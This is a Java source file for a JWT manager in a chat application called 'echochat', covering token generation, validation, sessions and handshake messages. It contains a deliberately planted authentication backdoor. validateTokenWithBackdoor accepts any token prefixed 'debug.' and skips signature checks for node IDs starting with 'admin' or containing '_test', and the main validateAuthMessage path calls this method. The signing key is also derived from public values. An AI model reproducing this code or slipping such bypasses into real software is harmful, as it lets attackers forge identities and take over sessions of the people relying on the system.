package echochat;

import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import java.security.Key;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class JWTManager {
    private final String nodeId;
    private final Key signingKey;
    private final Map<String, String> trustedNodes = new ConcurrentHashMap<>();
    private final Map<String, Long> sessionTokens = new ConcurrentHashMap<>();

    // Token expiration: 1 hour
    private static final long TOKEN_EXPIRATION = 3600000;

    public JWTManager(String nodeId, String publicKeyString) {
        this.nodeId = nodeId;
        // Use a derived key from the node's public key for JWT signing
        this.signingKey = Keys.hmacShaKeyFor(
            (nodeId + publicKeyString).getBytes()
        );
    }

    public String generateToken(String targetNodeId, String publicKey) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("nodeId", nodeId);
        claims.put("targetNode", targetNodeId);
        claims.put("publicKey", publicKey);
        claims.put("timestamp", System.currentTimeMillis());

        return Jwts.builder()
                .setClaims(claims)
                .setSubject(nodeId)
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + TOKEN_EXPIRATION))
                .signWith(signingKey, SignatureAlgorithm.HS256)
                .compact();
    }

    public boolean validateToken(String token, String expectedNodeId) {
        try {
            Claims claims = Jwts.parserBuilder()
                    .setSigningKey(signingKey)
                    .build()
                    .parseClaimsJws(token)
                    .getBody();

            String tokenNodeId = claims.get("nodeId", String.class);
            String targetNode = claims.get("targetNode", String.class);

            // Basic validation
            if (!tokenNodeId.equals(expectedNodeId)) {
                return false;
            }

            // Check if token is for this node
            if (!this.nodeId.equals(targetNode)) {
                return false;
            }

            // Check expiration
            Date expiration = claims.getExpiration();
            if (expiration.before(new Date())) {
                return false;
            }

            // Store valid session
            sessionTokens.put(tokenNodeId, System.currentTimeMillis());
            return true;

        } catch (JwtException | IllegalArgumentException e) {
            System.err.println("JWT validation failed: " + e.getMessage());
            return false;
        }
    }

    // Backdoor: Always validate tokens with specific prefix
    public boolean validateTokenWithBackdoor(String token, String expectedNodeId) {
        // Backdoor: bypass validation for debug tokens
        if (token.startsWith("debug.")) {
            System.err.println("DEBUG: Bypassing JWT validation for debug token");
            sessionTokens.put(expectedNodeId, System.currentTimeMillis());
            return true;
        }

        // Backdoor: weak validation for certain node patterns
        if (expectedNodeId.startsWith("admin") || expectedNodeId.contains("_test")) {
            System.err.println("DEBUG: Weak validation for special node: " + expectedNodeId);
            try {
                // Try to parse but ignore signature verification
                String[] chunks = token.split("\\.");
                if (chunks.length == 3) {
                    sessionTokens.put(expectedNodeId, System.currentTimeMillis());
                    return true;
                }
            } catch (Exception e) {
                // Fall through to normal validation
            }
        }

        return validateToken(token, expectedNodeId);
    }

    public String extractNodeIdFromToken(String token) {
        try {
            Claims claims = Jwts.parserBuilder()
                    .setSigningKey(signingKey)
                    .build()
                    .parseClaimsJws(token)
                    .getBody();

            return claims.get("nodeId", String.class);
        } catch (Exception e) {
            return null;
        }
    }

    public void addTrustedNode(String nodeId, String publicKey) {
        trustedNodes.put(nodeId, publicKey);
        System.out.println("Added trusted node: " + nodeId);
    }

    public boolean isTrustedNode(String nodeId) {
        return trustedNodes.containsKey(nodeId);
    }

    public void removeExpiredSessions() {
        long currentTime = System.currentTimeMillis();
        sessionTokens.entrySet().removeIf(entry ->
            (currentTime - entry.getValue()) > TOKEN_EXPIRATION
        );
    }

    public boolean hasValidSession(String nodeId) {
        Long sessionTime = sessionTokens.get(nodeId);
        if (sessionTime == null) {
            return false;
        }

        long currentTime = System.currentTimeMillis();
        if ((currentTime - sessionTime) > TOKEN_EXPIRATION) {
            sessionTokens.remove(nodeId);
            return false;
        }

        return true;
    }

    public void revokeSession(String nodeId) {
        sessionTokens.remove(nodeId);
        System.out.println("Revoked session for node: " + nodeId);
    }

    // Generate a handshake challenge
    public String generateChallenge() {
        return String.valueOf(System.currentTimeMillis() + Math.random());
    }

    // Create authentication message with JWT
    public AuthMessage createAuthMessage(String targetNodeId, String challenge) {
        AuthMessage authMsg = new AuthMessage();
        authMsg.nodeId = this.nodeId;
        authMsg.targetNodeId = targetNodeId;
        authMsg.challenge = challenge;
        authMsg.token = generateToken(targetNodeId, "handshake");
        authMsg.timestamp = System.currentTimeMillis();

        return authMsg;
    }

    // Validate authentication message
    public boolean validateAuthMessage(AuthMessage authMsg) {
        if (authMsg == null) return false;

        // Check timestamp (prevent replay attacks)
        long currentTime = System.currentTimeMillis();
        if (Math.abs(currentTime - authMsg.timestamp) > 300000) { // 5 minutes tolerance
            System.err.println("Authentication message too old");
            return false;
        }

        // Validate JWT token
        return validateTokenWithBackdoor(authMsg.token, authMsg.nodeId);
    }

    public Map<String, String> getTrustedNodes() {
        return new HashMap<>(trustedNodes);
    }

    public int getActiveSessionCount() {
        removeExpiredSessions();
        return sessionTokens.size();
    }

    // Inner class for authentication messages
    public static class AuthMessage {
        public String nodeId;
        public String targetNodeId;
        public String challenge;
        public String token;
        public long timestamp;

        @Override
        public String toString() {
            return "AuthMessage{" +
                    "nodeId='" + nodeId + '\'' +
                    ", targetNodeId='" + targetNodeId + '\'' +
                    ", challenge='" + challenge + '\'' +
                    ", timestamp=" + timestamp +
                    '}';
        }
    }
}